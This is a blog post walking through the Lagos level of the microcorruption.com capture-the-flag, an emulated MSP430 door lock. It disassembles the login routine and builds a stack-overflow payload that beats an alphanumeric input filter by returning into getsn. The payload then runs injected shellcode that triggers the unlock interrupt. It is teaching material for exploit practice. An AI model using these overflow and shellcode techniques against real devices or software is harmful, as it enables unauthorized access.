---
layout: post
title: 'Fun with Assembly 17: Beating constraints'
date: 2015-09-03
status: publish
type: post
published: true
author: Hywel Carver
---
This is the seventeenth in a series. You might want to read the [previous post]({% post_url 2015-09-02-fun-with-assembly-16 %}) before reading this.

This post is based on the Lagos level on [microcorruption.com](http://microcorruption.com). Like last time, we’re trying to find an input to open a lock without knowing the correct password, using knowledge of assembly language.

# First steps

The introduction to this level tells us that the passwords have to be alphanumeric which is going to mean bytes between `0x30-0x39`, `0x41-0x5a` and `0x61-0x7a`. Let's look at the `login` function.

    455e <login>
    455e:  0b12           push  r11
    4560:  3150 f0ff      add   #0xfff0, sp

Add 16 bytes to the stack.

    4564:  3f40 7044      mov   #0x4470 "Enter the password to continue.", r15
    4568:  b012 6046      call  #0x4660 <puts>
    456c:  3f40 9044      mov   #0x4490 "Remember: passwords are between 8 and 16 characters.", r15
    4570:  b012 6046      call  #0x4660 <puts>
    4574:  3f40 c544      mov   #0x44c5 "Due to some users abusing our login system, we have", r15
    4578:  b012 6046      call  #0x4660 <puts>
    457c:  3f40 f944      mov   #0x44f9 "restricted passwords to only alphanumeric characters.", r15
    4580:  b012 6046      call  #0x4660 <puts>

Print out some messages.

    4584:  3e40 0002      mov   #0x200, r14
    4588:  3f40 0024      mov   #0x2400, r15
    458c:  b012 5046      call  #0x4650 <getsn>

Get up to 512 (`0x200`) bytes of input at `0x2400`.

    4590:  5f42 0024      mov.b &0x2400, r15
    4594:  0e43           clr   r14
    4596:  7c40 0900      mov.b #0x9, r12
    459a:  7d40 1900      mov.b #0x19, r13
    459e:  073c           jmp   #0x45ae <login+0x50>

Set things up for the next block of iteration... `r14` will end up being the length of the string.

    45a0:  0b41           mov   sp, r11
    45a2:  0b5e           add   r14, r11
    45a4:  cb4f 0000      mov.b r15, 0x0(r11)
    45a8:  5f4e 0024      mov.b 0x2400(r14), r15
    45ac:  1e53           inc   r14

`r11` points to the next byte to save to on the stack, move the next byte from the input there. Then get the next byte ready for the next iteration.

    45ae:  4b4f           mov.b r15, r11
    45b0:  7b50 d0ff      add.b #0xffd0, r11
    45b4:  4c9b           cmp.b r11, r12
    45b6:  f42f           jc    #0x45a0 <login+0x42>

If (the next byte - `0x30`) <= 9 and >= 0 (to avoid overflow), continue writing it. (i.e. the byte is `>= 0x30` and `<= 0x39`)

    45b8:  7b50 efff      add.b #0xffef, r11
    45bc:  4d9b           cmp.b r11, r13
    45be:  f02f           jc    #0x45a0 <login+0x42>

If (the next byte - `0x41`) <= 19 and >= 0, continue writing it. (i.e. the byte is `>= 0x41` and `<= 0x5a`).

    45c0:  7b50 e0ff      add.b #0xffe0, r11
    45c4:  4d9b           cmp.b r11, r13
    45c6:  ec2f           jc    #0x45a0 <login+0x42>

And if (the next byte - `0x61`) <= 19 and >= 0, continue writing it. (i.e. the byte is `>= 0x61` and `<=0x7a`).

So the whole password will be written onto the stack, right up until the first character that isn't alphanumeric.

    45c8:  c143 0000      mov.b #0x0, 0x0(sp)

Make the first byte on the stack `0x0`, because the first character in the input actually gets written twice (because `0x459e` jumps to `0x45ae` when it should probably be jumping to `0x45ac`, to increment `r14` ready for the next iteration).

    45cc:  3d40 0002      mov   #0x200, r13
    45d0:  0e43           clr   r14
    45d2:  3f40 0024      mov   #0x2400, r15
    45d6:  b012 8c46      call  #0x468c <memset>

Set all the bytes that might have been touched by the input directly (`0x200` bytes from `0x2400` onwards) to `0x0`.

    45da:  0f41           mov   sp, r15
    45dc:  b012 4644      call  #0x4446 <conditional_unlock_door>
    45e0:  0f93           tst   r15
    45e2:  0324           jz    #0x45ea <login+0x8c>
    45e4:  3f40 2f45      mov   #0x452f "Access granted.", r15
    45e8:  023c           jmp   #0x45ee <login+0x90>
    45ea:  3f40 3f45      mov   #0x453f "That password is not correct.", r15
    45ee:  b012 6046      call  #0x4660 <puts>

Send the password to the door lock and tell the user whether it was right or not.

    45f2:  3150 1000      add   #0x10, sp
    45f6:  3b41           pop   r11
    45f8:  3041           ret

Clear up the stack.

# Developing an exploit

We have a lot of bytes of input we can use, and we can clearly overflow the stack. However we can only use bytes between `0x30-0x39`, `0x41-0x5a` and `0x61-0x7a`.

For the door to open, we eventually need to get to calling `0x10` with the right value in the status register (`sr`). `0x10` is going to be impossible for us to pass through the password string though. However, it is used by the `INT` function, which is at `0x45fc`. We can't pass both of those bytes through the password though. However, there are several instructions where the `INT` function is called, which we could return directly onto. But then we have to work out how to get the right arguments there.

This is looking pretty complicated. Looking at the other functions we have, we could drop into `getsn` - that way we might be able to get more input, that isn't constrained to be alphanumeric.

If we dropped into `0x4654`, the next 3 byte-pairs on the stack would be the address to write to, the number of bytes to write, and then the address `getsn` will return to. Let's choose the address to write to to be on the stack, and let's then return to the same address. For example, `0x4430` for all 3 will write up to `0x4430` bytes and then execute them.

With some spacer bytes to get beyond the allocated stack input: `4141414141414141414141414141414141` + `5446` to return into `getsn` + `304430443044` to get the input and run it.

When prompted for more input, we just have to enter the code we want to run.

    push #0x7f
    call  #0x45fc

assembles to `30127f00b012fc45`. so that's what we enter.

# The door springs open

This is a fun exploit. As usual, the pattern is to take the limitation (of alphanumeric-only input) and then find a way to get around it. Here, that means using `getsn` to allow for unconstrained input.